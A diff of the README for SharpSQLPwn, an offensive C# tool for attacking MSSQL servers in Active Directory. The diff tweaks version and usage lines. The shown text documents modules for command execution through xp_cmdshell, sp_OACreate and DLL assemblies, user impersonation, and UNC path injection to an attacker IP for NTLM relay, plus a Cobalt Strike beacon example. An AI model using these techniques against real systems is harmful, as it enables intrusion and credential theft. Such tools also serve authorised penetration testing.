@@ -12,7 +12,6 @@ C# tool to identify and exploit weaknesses with MSSQL instances in Active Direct
 /____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/
                      /_/
    https://github.com/lefayjey/SharpSQLPwn
-   Version:  1.2
    Author:  lefayjey
 
 
@@ -25,7 +24,7 @@ Usage:
         SharpSQLPwn.exe /modules:C[I] /target:SQLServer [/db:DatabaseName] /cmdtech:CmdExecTechnique /cmd:Command [/impuser:ImpersonatedUser]
     - UNC Path Injection (Optional: add module I to impersonate user before path injection):
         SharpSQLPwn.exe /modules:U[I] /target:SQLServer [/db:DatabaseName] /localIP:AttackerIP [/impuser:ImpersonatedUser]
-    - Linked Servers (Optional: add module C to execute command on linked SQL server, and module U to perform path injection:
+    - Linked Servers (Optional: add /cmd:<command> to execute command on linked SQL server, and /localIP:<AttackerIP> to perform path injection):
         SharpSQLPwn.exe /modules:L /target:SQLServer [/db:DatabaseName] /linkedsql:LinkedSQLServer [/cmdtech:CmdExecTechnique] [/cmd:Command] [/localIP:AttackerIP]
     - All modules:
         SharpSQLPwn.exe /modules:RICUL /target:SQLServer [/db:DatabaseName] /impuser:ImpersonatedUser /cmdtech:CmdExecTechnique /cmd:Command /localIPAttackerIP /linkedsqlLinkedSQLServer
@@ -47,7 +46,7 @@ Arguments:
             1=xp_cmdshell
             2=sp_OACreate
             3=dll_assembly
-    /cmd         - Command to execute (default: whoami)
+    /cmd         - Command to execute
     /localIP     - Local IP of the attacker (used for responder or ntlmrelay or Inveigh)
     /linkedsql   - Target linked SQL Server Hostname or IP
     /interactive - Run Interactive version
@@ -68,6 +67,5 @@ beacon> execute-assembly C:\path\to\SharpSQLPwn.exe
 /____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/ 
                      /_/                                              
    https://github.com/lefayjey/SharpSQLPwn
-   Version:  1.2
    Author:  lefayjey
 ```
